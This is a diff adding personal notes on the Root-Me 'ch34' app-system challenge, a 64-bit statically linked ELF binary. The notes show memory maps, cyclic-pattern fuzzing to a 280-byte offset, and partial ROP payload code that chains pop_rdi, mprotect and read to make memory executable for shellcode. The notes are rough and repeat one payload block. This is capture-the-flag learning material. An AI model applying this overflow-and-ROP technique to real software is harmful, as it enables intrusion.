@@ -1,0 +1,91 @@
+ch34 rootme app-system
+
+
+ch34: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=77da64c7e642a6fcd18bcbb51e2be86530a0cda8, not stripped
+
+Observations:
+
+
+It is statically linked.
+There is are plenty of functions to perform an exploit without using a libc.
+
+
+
+# Attempt 1
+
+
+mprotect + read =
+
+The reason i want im getting an idea to do this is simply there's no RWX
+memory layout.
+
+ex.
+pwndbg> vmmap
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+          0x400000           0x49e000 r-xp    9e000 0      /root/lab/ch34_rootme/ch34
+          0x69e000           0x6a4000 rw-p     6000 9e000  /root/lab/ch34_rootme/ch34
+          0x6a4000           0x6c8000 rw-p    24000 0      [heap]
+    0x7ffff7ffa000     0x7ffff7ffd000 r--p     3000 0      [vvar]
+    0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000 0      [vdso]
+    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
+
+
+If i can get a control of EIP, providing the proper ROP gadgets. Ill be able
+to change the permissions to RWX on a range of virtal memory. Afterwards, lay
+down some shellcode, then jump to it.
+
+Success
+-------
+    0x7ffff7ffd000     0x7ffff7ffe000 rwxp     1000 0      [vdso]
+
+
+# Attempt 2
+
+
+1. fuzz
+
+root@kali:~/lab/ch3_rootme# pattern_create -l 300                              
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9                   
+root@kali:~/lab/ch3_rootme# pattern_offset -q 0x356a41346a41336a
+[*] Exact match at offset 280
+root@kali:~/lab/ch3_rootme#
+
+
+
+2. eip overwrite
+
+run < <(python -c 'print "A" * 280 + "B" * 8')
+
+
+3. eip2mprotect
+
+
+Where can i jump to?
+How can i ROP?
+no-pie means i can jump to any function on the stack.
+
+payload = ""
+payload += "A" * 280
+payload += p64(pop_rdi)
+payload += p64(vdso)
+payload += p64(pop2ret)
+payload += p64(0x7)
+payload += p64(0x1000)
+payload += p64(mprotect)
+
+payload += p64(read)
+payload += "B" * 8
+
+4. read
+
+payload = ""
+payload += "A" * 280
+payload += p64(pop_rdi)
+payload += p64(vdso)
+payload += p64(pop2ret)
+payload += p64(0x7)
+payload += p64(0x1000)
+payload += p64(mprotect)
+
+payload += p64(read)
+payload += "B" * 8
